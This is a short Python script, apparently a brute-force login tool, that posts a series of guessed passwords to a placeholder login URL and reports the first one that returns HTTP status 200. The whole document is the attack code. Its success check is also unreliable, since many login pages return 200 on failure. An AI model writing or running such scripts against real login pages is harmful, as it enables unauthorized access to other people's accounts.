import requests
import time

url = "http://example.com/login"
credentials = {
    "username": "your_username",
    "password": "221460",
}

def brute_force(url, credentials):
    for i in range(1, 11):
        credentials["password"] = f"221460{i}"
        response = requests.post(url, data=credentials)
        if response.status_code == 200:
            print(f"Found password: 221460{i}")
            break
        time.sleep(1)

if __name__ == "__main__":
    brute_force(url, credentials)